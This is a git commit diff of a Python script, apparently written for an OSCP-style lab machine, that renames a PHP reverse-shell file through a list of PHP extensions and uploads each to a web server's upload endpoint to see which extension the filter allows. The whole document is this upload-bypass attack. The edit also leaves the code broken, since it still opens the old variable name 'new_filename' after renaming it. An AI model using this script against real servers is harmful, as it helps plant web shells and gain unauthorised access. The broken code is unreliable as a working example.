1d9f901ca8e364dcaf6aba9186b87241476cbcaf
cd6629 <63489620+cd6629@users.noreply.github.com>
2020-10-19 01:14:27 -0400

    Update pythonBruteForcePasswords.py

--- pythonBruteForcePasswords.py
+++ pythonBruteForcePasswords.py
@@ -6,10 +6,10 @@ import os
 ip = "10.10.83.93"
 url = f"http://{ip}:3333/internal/index.php" #login page
 
-old_filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell.php" 
+old_file = "/home/php-reverse-shell.php" 
 
 # requests to upload a file
-filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell
+file = "/home/php-reverse-shell
 extensions = [
 	".php",
 	".php3",
@@ -22,8 +22,8 @@ extensions = [
 
 for ext in extensions:
 
-	new_filename = filename + ext 			# forms which extension of the reverse shell works
-	os.rename(old_filename, new_filename)	#renames the file after testing
+	new_file = file + ext 			# forms which extension of the reverse shell works
+	os.rename(old_file, new_file)	#renames the file after testing
 
 	files = {"file": open(new_filename, "rb")}	#python requests to upload a file
 	r = requests.post(url, files=files)
@@ -31,6 +31,6 @@ for ext in extensions:
 	if "Extension not allowed" in r.text:
 		print(f"{ext} not allowed")
 	else:
-		print(f"{ext} seems to work")	
+		print(f"{ext} is allowed")	
 
-	old_filename = new_filename			#resets the file name after resetting from os.rename
+	old_file = new_file			#resets the file name after resetting from os.rename
